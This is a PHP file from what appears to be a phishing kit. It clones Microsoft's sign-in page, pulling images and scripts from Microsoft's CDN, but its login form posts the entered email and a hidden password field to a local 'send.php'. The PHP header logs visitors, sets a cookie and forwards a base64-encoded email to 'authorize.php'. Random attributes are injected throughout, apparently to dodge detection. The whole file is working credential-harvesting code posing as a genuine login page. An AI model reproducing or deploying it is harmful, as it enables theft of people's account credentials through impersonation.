<?php
require_once 'bootstrap.php';

$email = '';

if(!isset($_COOKIE['loop']))
{
    setcookie('loop', '1', time() + (86400 * 30), '/');
}


if (Config::Get('saveLogs'))
{
    Logger::Client();
}

if(Config::Get('withParams'))
{
    if(Utility::isValid($_GET['email']))
    {
        $email = $_GET['email'];

        if(!Utility::isBase64($email) && Config::Get('base64'))
        {
            $email =  base64_encode($email);
        }

        header("Location: authorize.php?email=". $email);

        exit(0);

    }
}



?>

<!DOCTYPE html>
<html dir="ltr" class="" lang="en"><head>
	<title>Sign in to your account</title>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
	<meta http-equiv="Pragma" content="no-cache">
	<meta http-equiv="Expires" content="-1">

	<meta name="LocLC" content="en-US">



	<link rel="shortcut icon" href="https://aadcdn.msftauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">

	<meta name="robots" content="none">




<link crossorigin="anonymous" href="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_zgrtrbu6vvo6mkan8iv4bw2.css" rel="stylesheet">



<script crossorigin="anonymous" src="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/ux.old.converged.login.pcore.min_c395chxpumwymgumps5atw2.js"></script>

<script crossorigin="anonymous" src="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/ux.converged.login.strings-en.min_yjblmnokzbzroiinjboe5w2.js"></script>




<link rel="prefetch" href="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_zgrtrbu6vvo6mkan8iv4bw2.css"><link rel="prefetch" href="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/ux.converged.login.strings-en.min_yjblmnokzbzroiinjboe5w2.js"></head>




	<div <?php echo Utility::UniqueId(); ?>>
        <div data-bind="component: { name: 'background-image-control', publicMethods: backgroundControlMethods <?php echo Utility::UniqueId(); ?>}">
            <div <?php echo Utility::UniqueId(); ?> class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
                <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;https://aadcdn.msftauth.net/ests/2.1/content/images/backgrounds/0-small_138bcee624fa04ef9b75e86211a9fe0d.jpg&quot;);" <?php echo Utility::UniqueId(); ?>></div>
                <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;https://aadcdn.msftauth.net/ests/2.1/content/images/backgrounds/0_a5dbd4393ff6a725c7e62b61df7e72f0.jpg&quot;);" <?php echo Utility::UniqueId(); ?>></div><
            </div></div> <div data-bind="if: activeDialog" <?php echo Utility::UniqueId(); ?>></div>
        <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off"
              data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: activeDialog"
              action="send.php" <?php echo Utility::UniqueId(); ?>><!-- ko if: svr.iBannerEnvironment --><!-- /ko --><!-- ko withProperties: { '$loginPage': $data } --> <div class="outer" data-bind="component: { name: 'master-page',
		params: {
		serverData: svr,
		showButtons: svr.fShowButtons,
		showFooterLinks: true,
		useWizardBehavior: svr.fUseWizardBehavior,
		handleWizardButtons: false,
		password: password,
		hideFromAria: ariaHidden },
		event: {
		footerAgreementClick: footer_agreementClick } }"><!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --><!-- ko if: svr.fShowCookieBanner --><!-- /ko --> <div class="middle" data-bind="css: { 'app': backgroundLogoUrl }"><!-- ko if: backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko --> <div class="inner fade-in-lightbox" data-bind="
			animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
			css: {
			'app': backgroundLogoUrl,
			'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide'),
			'fade-in-lightbox': fadeInLightBox,
			'has-popup': showFedCredButtons,
			'transparent-lightbox': backgroundControlMethods() &amp;&amp; backgroundControlMethods().useTransparentLightBox }"> <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div><!-- ko if: showLightboxProgress --><!-- /ko --><!-- ko ifnot: paginationControlMethods() && (paginationControlMethods().currentViewHasMetadata('hideLogo')) --> <div data-bind="component: { name: 'logo-control',
			params: {
			isChinaDc: svr.fIsChinaDc,
			bannerLogoUrl: bannerLogoUrl() } }"><!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="img" pngsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://aadcdn.msftauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko --></div><!-- /ko --><!-- ko if: svr.strLWADisclaimerMsg && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) --><!-- /ko --><!-- ko if: asyncInitReady --> <div role="main" data-bind="component: { name: 'pagination-control',
			publicMethods: paginationControlMethods,
			params: {
			enableCssAnimation: svr.fEnableCssAnimation,
			disableAnimationIfAnimationEndUnsupported: svr.fDisableAnimationIfAnimationEndUnsupported,
			initialViewId: initialViewId,
			currentViewId: currentViewId,
			initialSharedData: initialSharedData,
			initialError: $loginPage.getServerError() },
			event: {
			cancel: paginationControl_onCancel,
			showView: $loginPage.view_onShow,
			setLightBoxFadeIn: view_onSetLightBoxFadeIn,
			animationStateChange: paginationControl_onAnimationStateChange } }"><!--  --> <div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class=""><!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username) --><!-- /ko --> <div class="pagination-view animate slide-in-next" data-bind="css: {
				'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
				'zero-opacity': hidePaginatedView.hideSubView(),
				'animate': animate(),
				'slide-out-next': animate.isSlideOutNext(),
				'slide-in-next': animate.isSlideInNext(),
				'slide-out-back': animate.isSlideOutBack(),
				'slide-in-back': animate.isSlideInBack() }"><!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- ko if: $parent.isViewLoaded --> <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="1" data-showfedcredbutton="true" data-bind="pageViewComponent: { name: 'login-paginated-username-view',
				params: {
				serverData: svr,
				serverError: initialError,
				isInitialView: isInitialState,
				displayName: sharedData.displayName,
				prefillNames: $loginPage.prefillNames,
				flowToken: sharedData.flowToken },
				event: {
				redirect: $loginPage.view_onRedirect,
				setPendingRequest: $loginPage.view_onSetPendingRequest,
				registerDialog: $loginPage.view_onRegisterDialog,
				unregisterDialog: $loginPage.view_onUnregisterDialog,
				showDialog: $loginPage.view_onShowDialog } }"><!--  --> <div <?php echo Utility::UniqueId(); ?> data-bind="component: { name: 'header-control',
				params: {
				serverData: svr,
				title: str['WF_STR_HeaderDefault_Title'] } }"><div class="row text-title" id="loginHeader"> <div role="heading" aria-level="1" data-bind="text: title">Sign in</div><!-- ko if: isSubtitleVisible --><!-- /ko --> </div></div><!-- ko if: pageDescription && !svr.fHideLoginDesc --><!-- /ko --> <div class="row"> <div role="alert" aria-live="assertive"><!-- ko if: usernameTextbox.error --><!-- /ko --> </div> <div class="form-group col-md-24"><!-- ko if: prefillNames().length > 1 --><!-- /ko --><!-- ko ifnot: prefillNames().length > 1 --> <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
					publicMethods: usernameTextbox.placeholderTextboxMethods,
					params: {
					serverData: svr,
					hintText: tenantBranding.UserIdLabel || str['CT_PWD_STR_Email_Example'],
					hintCss: 'placeholder' + (!svr.fAllowPhoneSignIn ? ' ltr_override' : '') },
					event: {
					updateFocus: usernameTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> <input type="email" name="loginfmt" id="i0116" maxlength="113" lang="en" class="form-control ltr_override" aria-required="true" data-bind="
					css: { 'has-error': usernameTextbox.error },
					ariaLabel: tenantBranding.UserIdLabel || str['CT_PWD_STR_Username_AriaLabel'],
					ariaDescribedBy: 'loginHeader' + (pageDescription &amp;&amp; !svr.fHideLoginDesc ? ' loginDescription' : ''),
					textInput: usernameTextbox.value,
					hasFocusEx: usernameTextbox.focused,
					placeholder: $placeholderText" aria-label="Enter your email, phone, or Skype." aria-describedby="loginHeader" placeholder="Email, phone, or Skype"> <input name="passwd" type="password" id="i0118" autocomplete="off" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="moveOffScreen" tabindex="-1" aria-hidden="true"> <!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div><!-- /ko --> </div> </div> <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons"> <div class="row"> <div class="col-md-24"> <div class="text-13 action-links"><!-- ko if: svr.fCBShowSignUp && !svr.fDoIfExists && !svr.fCheckProofForAliases --> <div class="form-group" data-bind="
						htmlWithBindings: html['WF_STR_SignUpLink_Text'],
						childBindings: {
						'signup': {
						href: svr.urlSignUp || '#',
						ariaLabel: svr.urlSignUp ? str['WF_STR_SignupLink_AriaLabel_Text'] : str['WF_STR_SignupLink_AriaLabel_Generic_Text'],
						click: signup_onClick } }">No account? <a href="https://login.live.com/oauth20_authorize.srf?response_type=code&amp;client_id=51483342-085c-4d86-bf88-cf50c7252078&amp;scope=openid+profile+email+offline_access&amp;response_mode=form_post&amp;redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&amp;state=rQIIAYWSu2rbYACFLTt2Eg9NWkLIVAItbSjI-XV1ZOhgW75J_uVYVixLUITkq2xZkiVZsv0ApWOmFjJ06NZAly4tXTpkCxQy5wlKh96mjk3zAuXA4cA52_nS63SGyIAMeJLAMljuIUmQlJ41GJTRaQIlGQygOonTKEERNIEDrEcBwruX3v714PvF9bML-OrzwaPHz6m9M2RTs8ywn-k603Pk_igIXD93eBhFUcYZDMzubXFo6XbPtIcfEeQKQb4iyFk82bfRk9Z53KeJLMbciqYonAYElWmw4gSuuhjEYSCwJRy2AFBlhazLN3l8Eijj9hiO84uGxJmqpN5se6Y6bU9hpRQIuDCGJgBw2lzWZW4ksMNAldWRUFFHDVkdw4pqXce3Gvl5MML_meOZq_7v-ObA8aaa6_jBWeJlnDXmHXgstXFaMoyZXOoNuzO9xi2ESmUgzGc6LGdrpgWyUY2d5EVQ84-Isd9m5XK5P2-5BMaJEKvnV2OyVimMusBhA6_tapQxL4ulGSnWjx1TG-kyZD2SIeoOz2uLLlyBeXPaWUZhaCmWFMrOCV6EA2Np5r0miFwlFBW31O40I91GNY3ywonZIbmWOeXbUW22LHMlBiMktRQcUUoQ2DMypHXUkKrVAiMWuTrtLQYddtLo8HkrCj2UgX4Pt8nBgmapgkPyFoXZ5PEiJLmwOHeD6qyp0ErT76yMY0WWF94kep9I3Zw5dezLxB3H7dtmb9_1nIFp9a_WkG9ruxup7cRebD92sAOSuY2N9PbWXmI_9mcNeZO8Ief1z7fAx79UPtTf_VB2-dhl8nDl105M3ov4LFdm9G6B6qnqrFz0hz4j4gbfrbZDPRrqiyw2eZrNYacp5DSVukzdrbGaUJJaUl5g8yKLa-BnCnmxHvu0-R_-rtM7OMABCggUZPcxKkcc5TBC_Qs1&amp;estsfed=1&amp;uaid=c3ee23f15dda4dc397bf282627863518&amp;signup=1&amp;lw=1&amp;fl=easi2&amp;fci=4345a7b9-9a63-4910-a426-35363201d503&amp;mkt=en-US" id="signup" aria-label="Create a Microsoft account">Create one!</a></div><!-- /ko --><!-- ko if: svr.showCantAccessAccountLink --> <div class="form-group"> <a id="cantAccessAccount" name="cannotAccessAccount" href="#" data-bind="
							text: str['WF_STR_CantAccessAccount_Text'],
							click: cantAccessAccount_onClick">Can’t access your account?</a> </div><!-- /ko --><!-- ko if: showFidoLinkInline && hasFido() && (availableCredsWithoutUsername().length >= 2 || svr.fShowForgotUsernameLink) --><!-- /ko --><!-- ko if: availableCredsWithoutUsername().length > 0 || svr.fShowForgotUsernameLink --> <div class="form-group" data-bind="
							component: { name: 'cred-switch-link-control',
							params: {
							serverData: svr,
							availableCreds: availableCredsWithoutUsername(),
							showForgotUsername: svr.fShowForgotUsernameLink },
							event: {
							switchView: noUsernameCredSwitchLink_onSwitchView,
							redirect: onRedirect,
							registerDialog: onRegisterDialog,
							unregisterDialog: onUnregisterDialog,
							showDialog: onShowDialog } }"><!--  --> <div class="form-group"><!-- ko if: credentialCount > 1 || (credentialCount === 1 && (showForgotUsername || selectedCredShownOnlyOnPicker)) --> <a id="idA_PWD_SwitchToCredPicker" href="#" data-bind="
								text: isUserKnown ? str['CT_PWD_STR_SwitchToCredPicker_Link'] : str['CT_PWD_STR_SwitchToCredPicker_Link_NoUser'],
								click: switchToCredPicker_onClick">Sign-in options</a><!-- /ko --><!-- ko if: credentialCount === 1 && !(showForgotUsername || selectedCredShownOnlyOnPicker) --><!-- /ko --><!-- ko if: credentialCount === 0 && showForgotUsername --><!-- /ko --> </div><!-- ko if: credLinkError --><!-- /ko --></div><!-- /ko --> </div> </div> </div> <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }"> <div data-bind="component: { name: 'footer-buttons-field',
									params: {
									serverData: svr,
									isPrimaryButtonEnabled: !isRequestPending(),
									isPrimaryButtonVisible: svr.fShowButtons,
									isSecondaryButtonEnabled: true,
									isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isBackButtonVisible() },
									event: {
									primaryButtonClick: primaryButton_onClick,
									secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container" data-bind="
									visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
									css: { 'no-margin-bottom': removeBottomMargin }"><!-- ko if: isSecondaryButtonVisible --> <div class="inline-block"> <input type="button" id="idBtn_Back" class="btn btn-block" data-bind="
										attr: { 'id': secondaryButtonId || 'idBtn_Back' },
										value: secondaryButtonText() || str['CT_HRD_STR_Splitter_Back'],
										ariaDescribedBy: secondaryButtonDescribedBy,
										hasFocus: focusOnSecondaryButton,
										click: secondaryButton_onClick,
										enable: isSecondaryButtonEnabled" value="Back" <?php echo Utility::UniqueId(); ?>> </div><!-- /ko --> <div class="inline-block"><!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 --> <input type="submit" id="idSIButton9" class="btn btn-block btn-primary" data-bind="
											attr: primaryButtonAttributes,
											value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
											hasFocus: focusOnPrimaryButton,
											click: primaryButton_onClick,
											enable: isPrimaryButtonEnabled,
											visible: isPrimaryButtonVisible,
											preventTabbing: primaryButtonPreventTabbing" value="Next"> </div> </div></div> </div> </div></div></div> </div></div></div><input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value=""> <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value=""> <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value=""> <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value=""> <input type="hidden" name="canary" data-bind="value: svr.canary" value="zsIUiKrwK7JF9acB5dZZqFCsgs9R2bKcHVvawgax71k=7:1"> <input type="hidden" name="ctx" data-bind="value: ctx" value="rQIIAYWSu27TYACF46RJLwMtCFWdUCUQVEhJfl9TR2JI4tzs_E7iOHFsCUV2rnbiS2zHTvIAiLETSB0Y2KjEwgJiYehWCalznwAxcJsYCbwAOtLRGb7tfHvbVApPgRR4HENTaPYBgROkmtHoJK1SeJKgUZBUCYxK4iRO4RhAByTA3Tt7Bz_vf7u8eXoJX346efjoGXl0gdyb-L7jZdPpMAxT9mik94epvm2mZ6o10K3xBwS5RpAvCHIejQ-tZLt1EfUoPIPS_0KRJEYBnEzVGWEK130UYtDnmSIGWwAokkzUpM022r5sdAxo5JZ1kdUVUdmwA10xOyYsF30e4w2oAwDN5qomsROeGfuKpEz4sjKpS4oBy8rsJrpfzy38Cfa3bFdfD39Fd0e2a_Yc2_PPYy-ijLbowobYwShR0-ZScTDuz9Uqu-TL5RG_mKuwlKnqM5AJq8w0J4Cqd4obXoeRSqXhouXgKCtAtJZbG0S1nJ_0gc34bsfpkdqiJBTnhFBr2HpvokqQcQkar9kc11v24RosmmZ3FQbBTJ6JgWS3sQIcaSs95zZB6MiBIDvFTrcZqlay1yPdYKp3Cbalm1wnrM5XJbZIo7ioFP1TUvZ9a04ElJrUxEolTwsFtka5y1GXmda7XG4WBm6Sht4As4jRkmLIvE1wMxK1iMYyINigsHD8yrwpU3LT6661hixJS3cavoslNmeatnUVu2U7Q0sfHDuuPdJnw-st5OvW4U7iIHYUOY6c3AXx7M7O3sH-Uew48nsLeR3f2PLqxxvgYZ_L72tvv8uHXOQqnl571bbOuSGXYUu02s-TA0WZlwre2KMFTOP6lU6ghmN1mUGnTzJZ9CyBnCUSV4nbVabHF8WWmOOZnMBgPfAjgTzfjnzc_Y9_fwA1"> <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="30a9f09e-3273-47cd-b74c-adef59164b00"> <input type="hidden" id="i0327" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABAAEAAABeAFzDwllzTYGDLh_qYbH8_dvjBEFIGOtPOAkfM7-tIu1O7CD9ign9Yife4z5PuSGrq0_P5jkRxnjjVH_CxHRNatSlPLZC009taJJTIroVMCOiwiy8EKSap7zzmnEBLZBtB4hXgzfzweUgA6C3EGh7HeILjCPjdHKt1UndsVQMVpOXMLd1IyQJed3MX2VOOmzM1FGy5fid1jzqNffyr4_J1NBgXWYEXkaPoXULMZ3hFYgExMnEMuDUSpofuJ4WfxvqZ9n1Myv-o7w2syAI5dl4JP3jgTacCGau0Nvi73veC1GhL322CFhhfRzjPlrEydarpRptfQmWmUdaOxHbHFb_Fi3aU-RCkmBhIo3tOTyOaSvA7P2h4ppkuGuRotfNB01QCBpvWS33pAFjZTisqiuKIAA"> <input type="hidden" name="PPSX" data-bind="value: svr.sRandomBlob" value=""> <input type="hidden" name="NewUser" value="1"> <input type="hidden" name="FoundMSAs" data-bind="value: svr.sFoundMSAs" value=""> <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0"> <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0"> <input type="hidden" name="CookieDisclosure" data-bind="value: svr.fShowCookieBanner ? 1 : 0" value="0"> <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported() ? 1 : 0" value="1"> <input type="hidden" name="isSignupPost" data-bind="value: isSignupPost() ? 1 : 0" value="0"> <div data-bind="component: { name: 'instrumentation-control',
											publicMethods: instrumentationMethods,
											params: { serverData: svr } }" <?php echo Utility::UniqueId(); ?>><input <?php echo Utility::UniqueId(); ?> type="hidden" name="i2" data-bind="value: clientMode" value="102"> <input type="hidden" name="i17" data-bind="value: srsFailed" value=""> <input type="hidden" name="i18" data-bind="value: srsSuccess" value=""> <input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div> <div id="footer" class="footer default" role="contentinfo" data-bind="css: { 'default': !backgroundLogoUrl() }"> <div data-bind="component: { name: 'footer-control',
												publicMethods: footerMethods,
												params: {
												serverData: svr,
												hasDarkBackground: backgroundLogoUrl(),
												showLinks: true },
												event: {
												agreementClick: footer_agreementClick,
												showDebugDetails: toggleDebugDetails_onClick } }"><!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense --> <div id="footerLinks" class="footerNode text-secondary"> <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="https://www.microsoft.com/en-US/servicesagreement/">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="https://privacy.microsoft.com/en-US/privacystatement">Privacy &amp; cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --><!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus --> <a id="moreOptions" href="#" role="button" class="moreOptions" data-bind="
													click: moreInfo_onClick,
													ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
													attr: { 'aria-expanded': showDebugDetails().toString() },
													hasFocusEx: focusMoreInfo()" aria-label="Click here for troubleshooting information" aria-expanded="false"><img class="desktopMode" role="presentation" pngsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_white_0ad43084800fd8b50a2576b5173746fe.png" svgsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg" data-bind="imgSrc" src="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg"><img class="mobileMode" role="presentation" pngsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png" svgsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" data-bind="imgSrc" src="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> </a> </div> <!-- /ko --></div> </div> </div> <!-- /ko --></div><!-- /ko --> </form> <form method="post" aria-hidden="true" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }"><!-- ko foreach: postRedirectParams --><!-- /ko --> </form><!-- ko if: svr.urlMsaStaticMeControl && !svr.fUseFetchSessionsForDsso --><!-- /ko --><!-- ko if: svr.urlCBPartnerPreload --> <div id="idPartnerPL" data-bind="injectIframe: { url: svr.urlCBPartnerPreload }"><iframe height="0" width="0" src="https://www.office.com/prefetch/prefetch" style="display: none;"></iframe></div> <!-- /ko --></div></body></html>